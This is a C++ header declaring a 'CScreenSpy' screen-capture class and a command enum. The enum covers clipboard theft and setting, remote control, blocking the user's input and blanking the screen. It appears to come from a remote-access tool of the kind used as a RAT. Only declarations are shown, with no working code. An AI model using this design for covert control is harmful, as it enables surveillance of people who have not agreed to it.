#pragma once
#include <windows.h>
#include "CursorInfo.h"
#include "jpeglib.h"


#ifdef _WIN64
#ifdef _DEBUG
#pragma comment(lib, "turbojpeg_64_d.lib")
#else
#pragma comment(lib, "turbojpeg_64_R.lib")
#endif
#else
#ifdef _DEBUG
#pragma comment(lib, "turbojpeg_32_d.lib")
#else
#pragma comment(lib, "turbojpeg_32_r.lib")
#endif
#endif

enum
{
	TOKEN_FIRSTSCREEN_QUICK,
	TOKEN_NEXTSCREEN_QUICK,
	TOKEN_CLIPBOARD_TEXT_QUICK,
	TOKEN_SIZE_QUICK,
	COMMAND_NEXT_QUICK,
	COMMAND_FLUSH_QUICK,
	COMMAND_SCREEN_RESET_QUICK,
	COMMAND_SCREEN_FPS_QUICK,
	COMMAND_SCREEN_BLOCK_INPUT_QUICK,
	COMMAND_SCREEN_BLANK_QUICK,
	COMMAND_SCREEN_CAPTURE_LAYER_QUICK,
	COMMAND_SCREEN_GET_CLIPBOARD_QUICK,
	COMMAND_SCREEN_CONTROL_QUICK,
	COMMAND_SCREEN_SET_CLIPBOARD_QUICK,
	COMMAND_SCREEN_ALGORITHM_HOME,
	COMMAND_SCREEN_ALGORITHM_XVID,
	COMMAND_SCREEN_ALGORITHM_RESET,
	COMMAND_COMMAND_SCREEN_UALITY60,
	COMMAND_COMMAND_SCREEN_UALITY85,
	COMMAND_COMMAND_SCREEN_UALITY100,
};

class CScreenSpy
{
public:
	CScreenSpy(int biBitCount = 32, bool bIsGray = false, UINT nMaxFrameRate = 1);
	virtual ~CScreenSpy();
	LPVOID getFirstScreen(LPDWORD lpdwBytes);
	LPVOID getNextScreen(LPDWORD lpdwBytes);
	BOOL ScanChangedRect(BOOL bCopyChangedRect);
	LPBITMAPINFO getBitmapInfo();
	UINT getBitmapInfoSize();
	void setAlgorithm(UINT nAlgorithm);
	void setCaptureLayer(BOOL bIsCaptureLayer);
	bool SwitchInputDesktop();
	void SendUALITY(int i);
	void SetFps(int nfps);
	int m_SendUALITY;
	HWND m_hDeskTopWnd;
	int iScreenX;//获取桌面x坐标
	int iScreenY;//获取桌面y坐标
	float	fDpiRatio;  //DPI
	int    m_nFullWidth;
	int    m_nFullHeight;
private:
	int    m_biBitCount;
	DWORD  m_dwBitBltRop;
	UINT   m_bAlgorithm;
	UINT   m_nMaxFrameRate;
	bool   m_bIsGray;

	BYTE   m_nIncSize;
	int    m_nScanLine;


	HDC    m_hDeskTopDC;
	HDC    m_hLastMemDC;
	HDC    m_hCurrMemDC;
	HDC    m_hRectMemDC;
	LPVOID m_lpvLastBits;
	LPVOID m_lpvCurrBits;
	LPVOID m_lpvRectBits;
	LPBITMAPINFO m_lpbmi_full;
	LPBITMAPINFO m_lpbmi_rect;
	HBITMAP m_hLastBitmap;
	HBITMAP m_hCurrBitmap;
	HBITMAP m_hRectBitmap;

	LPBYTE m_changedBuffer;
	UINT   m_changedOffset;
	int    m_nPerLineDataSize;

	CCursorInfo	m_CursorInfo;
	LPBITMAPINFO ConstructBitmapInfo(int biBitCount, int biWidth, int biHeight);
	void WriteChangedBuffer(LPBYTE lpData, int nCount);
	void CopyChangedRect(LPRGNDATA lpRgnData, DWORD dwRgnSize);
	int  BMP_JPG(int width, int height, int cbit, int quality, void* input, void** output);
	BOOL SelectInputWinStation();



	DWORD m_dwLastCapture;
	DWORD m_dwSleep;


};



